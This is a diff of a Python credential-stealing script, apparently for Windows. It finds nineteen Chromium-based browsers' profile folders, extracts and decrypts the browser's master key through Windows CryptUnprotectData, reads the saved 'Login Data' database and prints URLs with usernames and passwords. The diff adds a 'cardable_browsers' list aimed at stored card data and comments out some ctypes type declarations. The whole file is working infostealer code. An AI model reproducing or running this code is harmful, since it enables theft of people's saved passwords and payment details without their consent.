@@ -1,5 +1,5 @@
 
-# created by Noah Pearson (6e6f6168 aka vanillablunt)
+# Created by Noah Pearson (6e6f6168 aka vanillablunt)
 
 import base64
 import json
@@ -15,9 +15,6 @@ from Crypto.Cipher import AES
 
 from ctypes import c_buffer, Structure, POINTER, c_char, WinDLL, byref, c_void_p, create_string_buffer, memmove, sizeof
 from ctypes.wintypes import DWORD, BOOL, LPWSTR, HWND, LPCWSTR, LPVOID
-
-date = time.strftime("%d%m%Y_%H%M%S")
-tmp = tempfile.gettempdir()
 
 class datablob(Structure):
     _fields_ = [
@@ -35,13 +32,13 @@ class promptstruct(Structure):
 
 kernel32 = WinDLL('kernel32', use_last_error=True)
 localf = kernel32.LocalFree
-localf.restype = LPVOID
-localf.argtypes = [LPVOID]
+#localf.restype = LPVOID
+#localf.argtypes = [LPVOID]
 
 crypt32 = WinDLL('crypt32', use_last_error=True)
 crypt = crypt32.CryptUnprotectData
-crypt.restype = BOOL
-crypt.argtypes = [POINTER(datablob), POINTER(LPWSTR), POINTER(datablob), c_void_p, POINTER(promptstruct), DWORD, POINTER(datablob)]
+#crypt.restype = BOOL
+#crypt.argtypes = [POINTER(datablob), POINTER(LPWSTR), POINTER(datablob), c_void_p, POINTER(promptstruct), DWORD, POINTER(datablob)]
 
 def DecryptData(data):
     bufferIn = c_buffer(data,len(data))
@@ -58,35 +55,35 @@ def DecryptData(data):
 
 
 chromium_browsers = [
-    (u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
-    (u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
-    (u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
-    (u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
-    (u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
-    (u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
-    (u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
-    (u'chromium edge', u'{LOCALAPPDATA}\\Microsoft\\Edge\\User Data'),
-    (u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
-    (u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
-    (u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
-    (u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
-    (u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
-    (u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
-    (u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
-    (u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
-    (u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
-    (u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
-    (u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data')
+    '{LOCALAPPDATA}\\7Star\\7Star\\User Data',
+    '{LOCALAPPDATA}\\Amigo\\User Data',
+    '{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data',
+    '{LOCALAPPDATA}\\CentBrowser\\User Data',
+    '{LOCALAPPDATA}\\Chedot\\User Data',
+    '{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data',
+    '{LOCALAPPDATA}\\Chromium\\User Data',
+    '{LOCALAPPDATA}\\Microsoft\\Edge\\User Data',
+    '{LOCALAPPDATA}\\CocCoc\\Browser\\User Data',
+    '{LOCALAPPDATA}\\Elements Browser\\User Data',
+    '{LOCALAPPDATA}\\Epic Privacy Browser\\User Data',
+    '{LOCALAPPDATA}\\Google\\Chrome\\User Data',
+    '{LOCALAPPDATA}\\Kometa\\User Data',
+    '{APPDATA}\\Opera Software\\Opera Stable',
+    '{LOCALAPPDATA}\\Orbitum\\User Data',
+    '{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data',
+    '{LOCALAPPDATA}\\Torch\\User Data',
+    '{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data',
+    '{LOCALAPPDATA}\\Vivaldi\\User Data'
 ]
 
 existing_browsers = []
 exploitable_browsers = []
+cardable_browsers = []
 
 logins = []
 
-for browser in chromium_browsers:
-    browser_location = browser[1]
-    browser_location = browser_location.replace("{LOCALAPPDATA}",os.getenv("localappdata"))
+for browser_location in chromium_browsers:
+    browser_location = browser_location.replace("{LOCALAPPDATA}",os.getenv("localappdata")).replace("{APPDATA}",os.getenv("appdata"))
     browser_location = browser_location.replace("{APPDATA}",os.getenv("appdata"))
     if os.path.exists(browser_location):
         existing_browsers.append(browser_location)
@@ -96,14 +93,12 @@ for browser_location in existing_browsers:
         exploitable_browsers.append(browser_location)
 
 for browser_location in exploitable_browsers:
+    if os.path.exists(browser_location+"\\Default\\Web Data"):
+        cardable_browsers.append(browser_location)
+
+for browser_location in exploitable_browsers:
     local_state_path = browser_location + "\\Local State"
     login_data_path = browser_location + "\\Default\\Login Data"
-    with open(local_state_path) as f:
-        try:
-            data = json.load(f)
-            profiles |= set(data['profile']['info_cache'])
-        except Exception:
-            pass
     with open(local_state_path) as local_state_file:
         key = base64.b64decode(json.load(local_state_file)["os_crypt"]["encrypted_key"])
         key = key[5:]
@@ -123,6 +118,11 @@ for browser_location in exploitable_browsers:
         conn.close()
         os.remove(copied_database)
 
+print("""
+-------------------
+Chromium Logins
+-------------------
+""")
 for login in logins:
     if login[0] and login[1] and login[2]:
         print("URL: "+login[0])
